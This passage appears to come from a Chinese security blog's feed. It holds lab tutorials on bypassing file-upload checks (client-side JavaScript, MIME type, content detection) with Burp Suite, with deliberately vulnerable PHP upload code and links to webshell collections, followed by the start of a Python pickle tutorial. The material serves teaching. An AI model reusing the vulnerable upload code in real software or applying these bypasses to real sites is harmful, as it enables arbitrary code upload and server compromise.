class="string">"上传出错！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$msg=<span class="string">"文件不是gif图片"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>利用burpsuite重放，获取生成的随机图片文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload04.png" alt=""></p></li><li><p>利用本地文件包含访问图片<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload05.png" alt=""></p></li></ul><h3 id="0x03-恶意文件内容检测"><a href="#0x03-恶意文件内容检测" class="headerlink" title="0x03 恶意文件内容检测"></a>0x03 恶意文件内容检测</h3><ul><li>检测提交内容中是否包含Webshell等数据</li><li>推荐使用强混淆的weevely进行尝试，kail中自带<br><a href="https://github.com/sunge/Weevely" target="_blank" rel="noopener">https://github.com/sunge/Weevely</a></li><li>或者尝试开源的webshell收集项目<br><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（三）：服务端检测绕过】3.1服务端MIME类型检测绕过</title>
      <link href="/2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
      <url>/2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="本文内容"><a href="#本文内容" class="headerlink" title="本文内容"></a>本文内容</h3><ul><li>文件头content-type字段校验（image/gif等）绕过</li></ul><a id="more"></a><h3 id="0x01-服务端一般检测的内容"><a href="#0x01-服务端一般检测的内容" class="headerlink" title="0x01 服务端一般检测的内容"></a>0x01 服务端一般检测的内容</h3><ul><li>上传的文件名（扩展名、黑白名单）</li><li>MIME/TYPE （浏览器根据文件扩展名自动生成）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload01.png" alt="部分burpsuite截取的部分展示"></li></ul><h3 id="0x02-MIME了解"><a href="#0x02-MIME了解" class="headerlink" title="0x02 MIME了解"></a>0x02 MIME了解</h3><ul><li><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p></li><li><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></li><li><p>浏览器会自动根据所上传的文件的扩展名，对应到相应的MIME类型上</p></li><li><p>常见的白名单MIME/TYPE<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload02.png" alt=""></p></li></ul><h3 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a>0x03 实例分析</h3><ul><li>环境：windows+phpstudy+burpsuite</li><li>由于本地127.0.0.1burpsuite截不到包故采用本地网络地址</li></ul><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = <span class="string">'uploads/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">$msg= <span class="string">"&lt;br/&gt;成功上传至:&lt;b&gt; "</span>.$img_path.<span class="string">"&lt;/b&gt;"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line"></span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span> onsubmit=<span class="string">"return checkFile()"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>尝试上传一个含phpinfo的文件（phpinfo.php）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload04.png" alt=""></p></li><li><p>使用burpsuite截断修改content-type，重新提交报文<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload05.png" alt=""></p></li><li><p>将burpsuite截断关闭，访问上传的文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload06.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（二）：前端检测绕过】2.2提交报文修改检测</title>
      <link href="/2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/"/>
      <url>/2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>提交报文修改检测</li><li>绕过示例</li></ul><a id="more"></a><h3 id="0x01-提交报文修改检测（前端检测通用）"><a href="#0x01-提交报文修改检测（前端检测通用）" class="headerlink" title="0x01 提交报文修改检测（前端检测通用）"></a>0x01 提交报文修改检测（前端检测通用）</h3><ul><li><p>首先选择正常的文件进行上传</p></li><li><p>而后通过BurpSuite进行截包改包或改包重放完成文件上传</p><p>  这种方法前端绕过检测中通用，无需理会具体前端的检测代码，直接绕过前端进行上传报文的修改并提交</p></li></ul><h3 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h3><p>（1）环境<br>   <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass01.png" alt=""></p><p>（2）选择本地一张含phpinfo()函数的图片（phpinfo.jpg）,使用burpsuite截包<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass06.png" alt=""></p><p>（3）burpsuite进行重放<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass07.png" alt=""></p><ul><li><p>原始<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass08.png" alt=""></p></li><li><p>修改后：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass09.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（二）：前端检测绕过】2.1客户端检测绕过</title>
      <link href="/2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
      <url>/2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>主要客户端检测绕过类型</li><li>前端js检测绕过示例</li></ul><a id="more"></a><h3 id="0x01-客户端检测绕过"><a href="#0x01-客户端检测绕过" class="headerlink" title="0x01 客户端检测绕过"></a>0x01 客户端检测绕过</h3><p>（1）JavaScript检测：通过浏览器提交上传请求前，触发检测用JS脚本进行检测。</p><pre><code>例如：普通的表单上传</code></pre><p>（2）Flash AS脚本检测：上传用Flash，提交上传请求前，触发检测用AS脚本进行检测。</p><pre><code>例如:DZ的头像上传</code></pre><p>（3）APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中</p><ul><li>客户端检测一般只检测文件扩展名<blockquote><p>客户端进行的检测，可通过对客户端代码的一些修改或直接拦截修改报文即可绕过，所以这种上传限制约等于没有</p></blockquote></li></ul><h3 id="0x02-前端JavaScript检测绕过"><a href="#0x02-前端JavaScript检测绕过" class="headerlink" title="0x02 前端JavaScript检测绕过"></a>0x02 前端JavaScript检测绕过</h3><ul><li>查看onchange、onsubmit等事件<ul><li>onchange事件会在域的内容改变时发生</li><li>onsubmit事件会在表单中的确认按钮被点击时发生</li></ul></li><li>删除掉相关事件中的检测函数</li></ul><h3 id="0x03-测试案例"><a href="#0x03-测试案例" class="headerlink" title="0x03 测试案例"></a>0x03 测试案例</h3><p>（1）环境</p><pre><code>windows+phpstudy+uploadlab</code></pre><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass01.png" alt=""></p><p>（2）尝试上传含phpinfo()函数的php文件（phpinfo.php）</p><p>   <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass02.png" alt=""></p><p>（3）F12审查元素代码，找到事件触发函数<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass03.png" alt=""></p><p>（4）删除onsubmit，重新提交，并访问上传的文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass04.png" alt=""></p><p>（5）查看网页源代码可找到上传文件路径相关信息<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass05.png" alt=""></p><p>（6）js校验代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（一）】1.1文件上传漏洞原理及流程</title>
      <link href="/2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/"/>
      <url>/2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>文件上传流程、漏洞原因</li><li>burpsuite简单安装</li><li>dvwa文件上传简单示例</li></ul><a id="more"></a><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>流程：</p><ul><li>1.前端选择文件，进行提交</li><li>2.浏览器形成POST MultiPart报文发送到服务器</li><li>3.服务器中间件接收到报文，解析后交给相关后端代码进行处理</li><li>4.后端代码将上传的文件内容写入到临时文件中（PHP特有）</li><li>5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名</li></ul><h3 id="文件上传漏洞产生原因"><a href="#文件上传漏洞产生原因" class="headerlink" title="文件上传漏洞产生原因"></a>文件上传漏洞产生原因</h3><ul><li>文件上传未对上传的文件进行严格的验证和过滤，容易造成任意文件上传，包括上传动态文件（asp/php/jsp等等）</li><li>如果上传的目标目录没有限制执行权限，导致上传的动态文件（比如：webshell）可以正常执行并且可以访问，即造成了文件上传漏洞。</li></ul><h3 id="存在上传漏洞的必要条件"><a href="#存在上传漏洞的必要条件" class="headerlink" title="存在上传漏洞的必要条件"></a>存在上传漏洞的必要条件</h3><ul><li>存在上传点</li><li>可以上传动态文件</li><li>上传目录有执行权限，并且上传的文件可执行</li><li>可访问到上传的动态文件</li></ul><h3 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload04.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload05.png" alt=""></p><h3 id="BurpSuite简单安装"><a href="#BurpSuite简单安装" class="headerlink" title="BurpSuite简单安装"></a>BurpSuite简单安装</h3><ul><li>下载jdk</li><li>官网下载Burp Suite 2.1 </li><li>参考链接：<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite</a></li></ul><ul><li><p>简单代理配置</p><ul><li><p>火狐浏览器：选项-》网络设置-》设置<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite01.png" alt=""></p></li><li><p>burpsuite设置：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite02.png" alt=""></p></li></ul></li></ul><h3 id="使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）"><a href="#使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）" class="headerlink" title="使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）"></a>使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）</h3><ul><li><p>在火狐浏览器url栏输入：about:config</p></li><li><p>然后在搜索栏输入：network.proxy.allow_hijacking_localhost<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite03.png" alt=""></p></li></ul><h3 id="dvwa文件上传low简单示例"><a href="#dvwa文件上传low简单示例" class="headerlink" title="dvwa文件上传low简单示例"></a>dvwa文件上传low简单示例</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload01.png" alt=""></p><ul><li>burpsuite截包<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload02.png" alt=""></li></ul><h3 id="使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）"><a href="#使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）" class="headerlink" title="使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）"></a>使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）</h3><ul><li>将代理都修改为端口9999</li><li>测试：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload01.png" alt=""></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python序列化数据之pickle详解</title>
      <link href="/2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>学习python之pickle详解</p><a id="more"></a><h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><ul><li><p>便于存储（序列化过程：将文本信息转为==二进制数据流，易存储在硬盘中==）</p></li><li><p>反序列化从硬盘读取的数据，可得到原始数据</p></li><li><p>python程序运行中得到的字符串、列表等数据，要长久保存，方便之后使用（pickle模块可以将对象转换为已知可以传输或存储的格式）</p></li><li><p>python中序列化和反序列化</p><ul><li><p>将Python对象转换为二级制形式叫做序列化（Pickling）</p></li><li><p>将二进制数据流恢复为Python对象叫做反序列化（Unpickling）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A01/python_pickle.png" alt="python序列化反序列化"></p></li></ul><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><ul><li><p>提供了一个简单的==持久化==功能，可以将对象以==文件==形式存放在磁盘上</p></li><li><p>只能在python中使用，可以序列化python中几乎所有的数据类型（列表、字典…）</p></li><li><p>pickle序列化后的数据，可读性差</p></li><li><p>pickle序列化和反序列化示例</p><ul><li><p>819pickling_unpickling_example.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment"># 定义类Part</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    number = <span class="number">0</span></span><br><span class="line">    name   = <span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number, name)</span>:</span></span><br><span class="line">        self.number  = number</span><br><span class="line">        self.name    = name</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Part Number: %d"</span>%(self.number))</span><br><span class="line">        print(<span class="string">"Part Name: %s"</span>%(self.name))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 实例化part</span></span><br><span class="line">part1=Part(<span class="number">111</span>, <span class="string">"Spindle"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file to store the pickled object</span></span><br><span class="line"><span class="comment"># 创建文件存储pickled对象</span></span><br><span class="line">objectRepository = open(<span class="string">"ObjectFile.picl"</span>, <span class="string">"wb"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Pickle/serialize the python object and store the bytes into a binary file</span></span><br><span class="line"><span class="comment"># 序列化Python对象并存储为二进制字节流</span></span><br><span class="line">pickle.dump(part1, objectRepository, protocol=pickle.HIGHEST_PROTOCOL)</span><br><span class="line">objectRepository.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Unpickle/de-serialize the python object and print the attributes of the object</span></span><br><span class="line"><span class="comment"># 反序列化Python对象并打印对象属性</span></span><br><span class="line">objectRepository    = open(<span class="string">"ObjectFile.picl"</span>, <span class="string">"rb"</span>,);</span><br><span class="line">reconstructedObject = pickle.load(objectRepository)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Print object attributes</span></span><br><span class="line"><span class="comment"># 打印对象属性</span></span><br><span class="line">reconstructedObject.identify()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- 运行结果：</span><br></pre></td></tr></table></figure><p>  (venv) yuhao@fishmouse:~/Envs/venv/project$ python 819pickling_unpickling_example.py<br>  Part Number: 111<br>  Part Name: Spindle</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 序列化的数据</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  &gt;&gt;&gt; with open(&#39;ObjectFile.picl&#39;,&#39;rb&#39;) as f:</span><br><span class="line">  ...     f.read()</span><br><span class="line">  ... </span><br><span class="line">  b&#39;\x80\x04\x959\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Part\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x06number\x94Ko\x8c\x04name\x94\x8c\x07Spindle\x94ub.&#39;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>==序列化==语法</p><ul><li><p><a href="https://pythontic.com/modules/pickle/dump" target="_blank" rel="noopener">pickle.dump参考链接</a></p></li><li><p>pickle.dump(obj,file[,protocol])</p><ul><li>序列化对象，将结果数据流写入到文件对象或者buffer中</li></ul></li><li><p>参数protocol是序列化模式，一共有5种不同的类型，即（0,1,2,3,4）；</p><ul><li>（0,1,2）早期的版本，默认值为0（表示以文本形式序列化），值为1或2（表示以二级制的形式序列化）；</li><li>（3,4）则是python3之后的版本</li><li>查看（3,4）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.HIGHEST_PROTOCOL</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.DEFAULT_PROTOCOL</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>pickle.dump()：转换的字节流写入buffer中</p><ul><li><p>示例：819pickle_dump_example.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 